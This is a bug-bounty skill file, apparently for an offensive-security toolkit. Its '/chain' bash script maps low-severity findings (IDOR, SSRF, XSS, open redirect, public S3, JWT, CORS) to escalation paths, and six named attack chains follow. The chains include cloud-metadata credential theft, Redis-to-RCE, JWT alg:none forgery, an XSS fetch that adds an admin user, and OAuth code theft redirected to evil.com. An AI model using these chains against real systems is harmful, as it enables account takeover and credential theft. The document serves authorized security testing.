---
name: k1nzr3c0n-cmd-chain
description: "Vulnerability chaining advisor. Signal table: A→B connections (IDOR→ATO, SSRF→cloud-cred, XSS→ATO, open-redirect→OAuth, S3-public→bundle→secret→scope-escalation). 6 common named chains. Time-box: 45-min chain exploration limit. Use after initial finding to maximize impact."
tags: [command, chain, chaining, escalation]
---

# /chain — Vulnerability Chain Advisor

> Usage: `/chain` — run after finding a low/medium bug to find what it chains to.

---

## Signal → Chain Table

```bash
echo "=== Finding → Chain Lookup ==="
FINDING="${1:-IDOR}"

echo "Signal: ${FINDING}"
echo ""

case "${FINDING^^}" in
  IDOR|"INSECURE DIRECT OBJECT REFERENCE")
    echo "  Chains to:"
    echo "  → ATO: if IDOR exposes password reset token or email change → account takeover"
    echo "  → Data breach: if IDOR exposes PII at scale → bulk enumeration"
    echo "  → Privilege escalation: if IDOR exposes admin user object → elevate role"
    echo "  → GraphQL IDOR: test node() with base64 IDs → see hunt-graphql"
    ;;
  SSRF|"SERVER-SIDE REQUEST FORGERY")
    echo "  Chains to:"
    echo "  → Cloud metadata: 169.254.169.254 → IAM credentials → AWS API access"
    echo "  → Redis: ssrf→redis:6379 → SLAVEOF + module load → RCE"
    echo "  → Internal services: SSRF→internal admin → auth bypass"
    echo "  → Webhook: many webhook features have SSRF; probe internal hosts"
    ;;
  XSS|"CROSS-SITE SCRIPTING")
    echo "  Chains to:"
    echo "  → ATO: steal session cookie (httpOnly=false) → account takeover"
    echo "  → CSRF: XSS bypasses CSRF token (read token via XHR → use it)"
    echo "  → Credential theft: inject fake login form → phish user credentials"
    echo "  → MFA bypass: steal backup code from /api/me via XSS fetch"
    echo "  → WAF bypass: use XSS to reach same-origin admin endpoints"
    ;;
  "OPEN REDIRECT"|REDIRECT)
    echo "  Chains to:"
    echo "  → OAuth token theft: redirect_uri=evil.com → steal OAuth code in Referer"
    echo "  → Phishing: convincing URL on trusted domain → credential harvest"
    echo "  → SSRF: some SSRF filters trust same-domain redirects"
    ;;
  "S3"|"PUBLIC BUCKET"|"BUCKET")
    echo "  Chains to:"
    echo "  → JS bundle: download all JS from S3 → grep for API keys"
    echo "  → Source code: .js.map files → grep for secrets/routes"
    echo "  → Config files: .env, config.json → DB creds, API keys"
    echo "  → Scope escalation: secrets → other services → expand attack surface"
    ;;
  JWT)
    echo "  Chains to:"
    echo "  → Privilege escalation: change role claim → admin"
    echo "  → ATO: alg:none → forge any user"
    echo "  → SSRF via jku/x5u: JWT header → SSRF to internal service"
    ;;
  CORS)
    echo "  Chains to:"
    echo "  → ATO: credentialed CORS → steal session/token cross-origin"
    echo "  → Data exfil: read /api/me from evil.com with credentials"
    ;;
  *)
    echo "  General chain options:"
    echo "  → Combine with IDOR for ATO"
    echo "  → Combine with SSRF for cloud cred"
    echo "  → Check /skill k1nzr3c0n-cmd-surface for P1 targets"
    ;;
esac
```

## 6 Named Chains

```bash
echo ""
echo "=== Named Chains (most common successful patterns) ==="
cat << 'CHAINS'
Chain 1 — SSRF → Cloud Metadata → IAM Creds → S3/Dynamo:
  SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
  → AccessKeyId + SecretAccessKey → aws sts assume-role or s3 ls
  Time box: 45 min

Chain 2 — XSS → CSRF bypass → Admin action:
  Stored XSS in comment/profile → runs in admin context
  → fetch('/api/admin/add-user', {method:'POST',credentials:'include',...})
  Time box: 30 min (need admin to trigger stored XSS)

Chain 3 — Open Redirect → OAuth code theft:
  OAuth authorization: redirect_uri=https://target.com/redirect?next=https://evil.com
  → Auth code lands on evil.com in Referer header or URL param
  Time box: 20 min

Chain 4 — IDOR → Password Reset Token → ATO:
  GET /api/users/123 → reveals password_reset_token field
  → POST /reset-password with that token → change password → ATO
  Time box: 15 min

Chain 5 — S3 Public → JS Source → API Key → Scope Escalation:
  s3 ls s3://company-assets → download *.js → grep secrets
  → AWS key → s3 ls, dynamodb scan → customer data
  Time box: 30 min

Chain 6 — Subdomain Takeover → OAuth State Fixation:
  subdomain.target.com unregistered → claim it
  → legitimate OAuth flow with redirect to subdomain
  → capture OAuth token/code in server logs
  Time box: 60 min (setup required)
CHAINS
echo ""
echo "Time-box rule: abandon chain after 45 min of no progress"
echo "Document attempted chains in session scratch: /tmp/k1nzr3c0n_*/scratch/"
```
